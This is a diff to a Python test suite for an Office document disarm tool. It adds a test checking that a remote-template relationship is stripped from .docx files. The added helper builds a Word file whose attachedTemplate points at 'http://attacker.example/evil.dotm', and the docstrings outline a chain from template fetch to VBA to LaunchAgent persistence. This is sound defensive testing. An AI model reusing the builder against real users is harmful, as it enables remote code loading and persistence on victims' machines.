@@ -66,6 +66,33 @@ def _make_docx_with_external_link() -> bytes:
     return buf.getvalue()
 
 
+def _make_docx_with_remote_template(url: str = "http://attacker.example/evil.dotm") -> bytes:
+    """Return a .docx whose word/_rels/settings.xml.rels references a remote template
+    (the forefy/JXA-Persistency stage-1 vector: attachedTemplate rel → attacker http URL,
+    which Word fetches on open to pull VBA). See docs/JXA-Persistency.md."""
+    buf = io.BytesIO()
+    ns = "http://schemas.openxmlformats.org/package/2006/relationships"
+    tmpl_type = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
+    settings_rels = (
+        f'<?xml version="1.0"?>'
+        f'<Relationships xmlns="{ns}">'
+        f'<Relationship Id="rId1" Type="{tmpl_type}" Target="{url}" TargetMode="External"/>'
+        f'</Relationships>'
+    )
+    with zipfile.ZipFile(buf, "w") as z:
+        z.writestr("[Content_Types].xml", _minimal_content_types())
+        z.writestr("_rels/.rels", _minimal_rels())
+        z.writestr("word/settings.xml",
+                   '<w:settings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml'
+                   '/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/'
+                   '2006/relationships"><w:attachedTemplate r:id="rId1"/></w:settings>')
+        z.writestr("word/_rels/settings.xml.rels", settings_rels)
+        z.writestr("word/document.xml",
+                   '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml'
+                   '/2006/main"><w:body/></w:document>')
+    return buf.getvalue()
+
+
 def _make_pdf_with_js() -> bytes:
     """Return a PDF with an /OpenAction JavaScript trigger."""
     pdf = pikepdf.Pdf.new()
@@ -387,6 +414,24 @@ class TestOfficeCDR:
 
         assert any("vbaProject.bin" in r for r in report["removed"]), \
             "CDR report did not record macro removal"
+
+    def test_remote_template_chain_severed(self):
+        """forefy/JXA-Persistency stage 1: a .docx with an attachedTemplate rel pointing at
+        an attacker http server (Word fetches it on open to pull VBA → osascript → LaunchAgent
+        persistence). CDR must delete the rel so Word has no URL to fetch and the chain never
+        starts. See docs/JXA-Persistency.md."""
+        url = "http://attacker.example/evil.dotm"
+        data = _make_docx_with_remote_template(url)
+        clean, report = cdr.cdr_office(data, "docx")
+
+        with zipfile.ZipFile(io.BytesIO(clean)) as z:
+            rels = z.read("word/_rels/settings.xml.rels").decode()
+
+        assert "attachedTemplate" not in rels, \
+            "attachedTemplate relationship survived CDR — remote-template fetch still possible"
+        assert url not in rels, "attacker template URL still present in output rels"
+        assert any("attachedtemplate" in r.lower() for r in report["removed"]), \
+            "CDR report did not record the attachedTemplate rel removal"
 
     @pytest.mark.parametrize("evasive_name", [
         "./word/vbaProject.bin",
